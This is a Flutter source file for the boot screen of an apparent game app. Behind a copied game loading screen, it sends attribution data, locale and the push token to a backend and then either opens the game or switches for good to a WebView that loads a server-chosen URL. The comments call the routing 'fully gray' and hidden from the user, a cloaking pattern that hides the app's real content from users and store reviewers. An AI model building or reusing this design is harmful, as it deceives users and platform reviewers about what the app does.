import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/scheduler.dart';

import '../runtime/attribution_runtime.dart';
import '../runtime/backend_runtime.dart';
import '../runtime/net_sensor.dart';
import '../runtime/push_runtime.dart';
import '../runtime/vault.dart';
import '../setup/app_facade.dart';
import '../types/runtime_mode.dart';
import 'offline_stage.dart';
import 'push_promo_stage.dart';
import '../loading_screen.dart' as native;
import 'webview_stage.dart' deferred as shell;

/// First screen the user ever sees. Hosts the loading bar/dots, while
/// quietly running the gate logic:
///
///   unknown → check internet → attribution → backend → shell | native
///   shell   → pop push URL  OR re-fetch backend OR cached URL
///   native  → straight to the existing game intro
///
/// Visuals are reused 1:1 from the white-part loading screen so the
/// user never sees an extra "splash" — but the routing is fully gray.
class BootStage extends StatefulWidget {
  const BootStage({
    super.key,
    required this.vault,
    required this.netSensor,
    required this.attribution,
    required this.backend,
    required this.push,
  });

  final Vault vault;
  final NetSensor netSensor;
  final AttributionRuntime attribution;
  final BackendRuntime backend;
  final PushRuntime push;

  @override
  State<BootStage> createState() => _BootStageState();
}

class _BootStageState extends State<BootStage>
    with SingleTickerProviderStateMixin {
  late final Ticker _ticker;
  Duration _lastTick = Duration.zero;

  double _progress = 0.0;
  bool _routed = false;
  int _dots = 0;
  double _dotTimer = 0;

  @override
  void initState() {
    super.initState();
    _ticker = createTicker(_onTick)..start();
    _kickOff();
  }

  void _onTick(Duration elapsed) {
    final dt = _lastTick == Duration.zero
        ? 0.0
        : (elapsed - _lastTick).inMicroseconds / 1e6;
    _lastTick = elapsed;
    if (!mounted) return;

    _dotTimer += dt;
    if (_dotTimer >= 0.42) {
      _dotTimer = 0;
      _dots = (_dots + 1) % 4;
    }

    final speed = _routed ? 1.5 : 0.4;
    final cap = _routed ? 1.0 : 0.88;
    _progress = (_progress + dt * speed).clamp(0.0, cap);
    setState(() {});
  }

  Future<void> _kickOff() async {
    widget.push.onTokenRotated = _onTokenRotated;
    await widget.push.boot();

    final mode = widget.vault.readMode();
    switch (mode) {
      case RuntimeMode.shell:
        await _runReturningShell();
        break;
      case RuntimeMode.native:
        await _runNative();
        break;
      case RuntimeMode.unknown:
        await _runFirstLaunch();
        break;
    }
  }

  @override
  void dispose() {
    widget.push.onTokenRotated = null;
    _ticker.dispose();
    super.dispose();
  }

  void _onTokenRotated(String token) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attribution.buildPayload(
      locale: locale,
      pushToken: token,
    );
    widget.backend.hit(body); // fire-and-forget
  }

  // -- routes -----------------------------------------------------------

  Future<void> _runFirstLaunch() async {
    final hasNet = await widget.netSensor.isLive();
    if (!hasNet) {
      _routeToOffline();
      return;
    }

    await widget.attribution.boot();
    await Future.wait([
      widget.attribution.awaitConversion(
        Duration(seconds: AppFacade.firstLaunchAttribTimeoutSec),
      ),
      widget.attribution.awaitDeepLink(const Duration(seconds: 5)),
    ]);

    final locale = Platform.localeName.replaceAll('-', '_');
    final payload = await widget.attribution.buildPayload(
      locale: locale,
      pushToken: widget.push.token,
    );
    final reply = await widget.backend.hit(payload);

    if (reply.ok && reply.hasUrl) {
      await widget.vault.writeMode(RuntimeMode.shell);
      await _enterShell(reply.url!);
    } else {
      await widget.vault.writeMode(RuntimeMode.native);
      _routeToNative();
    }
  }

  Future<void> _runReturningShell() async {
    final hasNet = await widget.netSensor.isLive();
    if (!hasNet) {
      _routeToOffline();
      return;
    }

    // Push URL beats everything else.
    final pushed = await widget.vault.popPushUrl();
    if (pushed != null && pushed.isNotEmpty) {
      await _enterShell(pushed);
      return;
    }

    await widget.attribution.boot();
    await Future.wait([
      widget.attribution.awaitConversion(
        Duration(seconds: AppFacade.returningAttribTimeoutSec),
      ),
      widget.attribution.awaitDeepLink(const Duration(seconds: 5)),
    ]);

    final locale = Platform.localeName.replaceAll('-', '_');
    final payload = await widget.attribution.buildPayload(
      locale: locale,
      pushToken: widget.push.token,
    );
    final reply = await widget.backend.hit(payload);

    if (reply.ok && reply.hasUrl) {
      await _enterShell(reply.url!);
      return;
    }

    final cached = await widget.backend.cachedShellUrl();
    if (cached != null && cached.isNotEmpty) {
      await _enterShell(cached);
      return;
    }

    _routeToOffline();
  }

  Future<void> _runNative() async {
    // Native users return straight into the game's own loader, which
    // already handles its own asset warm-up and orientation.
    _routeToNative();
  }

  // -- navigation -------------------------------------------------------

  Future<void> _enterShell(String url) async {
    if (_routed) return;
    _routed = true;

    await shell.loadLibrary();
    await shell.primeShellEngine();
    if (!mounted) return;

    if (widget.vault.shouldShowPushPromo()) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => PushPromoStage(
            vault: widget.vault,
            push: widget.push,
            netSensor: widget.netSensor,
            shellUrl: url,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => shell.WebViewStage(
            targetUrl: url,
            vault: widget.vault,
            push: widget.push,
            netSensor: widget.netSensor,
          ),
        ),
      );
    }
  }

  void _routeToNative() {
    if (_routed) return;
    _routed = true;
    // Hand off to the existing white-part loading screen so the game
    // path is exercised exactly as it has always been.
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const native.LoadingScreen()),
    );
  }

  void _routeToOffline() {
    if (_routed) return;
    _routed = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => OfflineStage(
          rebuilder: (_) => BootStage(
            vault: widget.vault,
            netSensor: widget.netSensor,
            attribution: widget.attribution,
            backend: widget.backend,
            push: widget.push,
          ),
        ),
      ),
    );
  }

  // -- UI ---------------------------------------------------------------

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF8FD3FF),
      body: OrientationBuilder(
        builder: (context, orientation) {
          final isPortrait = orientation == Orientation.portrait;
          return Stack(
            fit: StackFit.expand,
            children: [
              Image.asset(
                isPortrait
                    ? 'assets/Vertical_LoadingScreen.webp'
                    : 'assets/Horizontal_LoadingScreen.webp',
                fit: BoxFit.cover,
              ),
              const DecoratedBox(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.center,
                    end: Alignment.bottomCenter,
                    colors: [Colors.transparent, Color(0x66000000)],
                  ),
                ),
              ),
              Align(
                alignment: Alignment.bottomCenter,
                child: Padding(
                  padding: EdgeInsets.only(
                    left: isPortrait ? 40 : 120,
                    right: isPortrait ? 40 : 120,
                    bottom: isPortrait ? 70 : 40,
                  ),
                  child: _BootBar(progress: _progress, dots: _dots),
                ),
              ),
            ],
          );
        },
      ),
    );
  }
}

class _BootBar extends StatelessWidget {
  const _BootBar({required this.progress, required this.dots});

  final double progress;
  final int dots;

  @override
  Widget build(BuildContext context) {
    return Column(
      mainAxisSize: MainAxisSize.min,
      children: [
        ClipRRect(
          borderRadius: BorderRadius.circular(20),
          child: Container(
            height: 18,
            decoration: BoxDecoration(
              color: const Color(0x55000000),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: Colors.white, width: 2),
            ),
            child: Align(
              alignment: Alignment.centerLeft,
              child: FractionallySizedBox(
                widthFactor: progress.clamp(0.0, 1.0),
                child: Container(
                  decoration: const BoxDecoration(
                    gradient: LinearGradient(
                      colors: [Color(0xFFFFD54F), Color(0xFFFFA000)],
                    ),
                  ),
                ),
              ),
            ),
          ),
        ),
        const SizedBox(height: 14),
        Text(
          'Loading${'.' * dots}',
          style: const TextStyle(
            color: Colors.white,
            fontSize: 20,
            fontWeight: FontWeight.w800,
            letterSpacing: 1.2,
            shadows: [
              Shadow(color: Colors.black54, blurRadius: 4, offset: Offset(0, 2)),
            ],
          ),
        ),
      ],
    );
  }
}
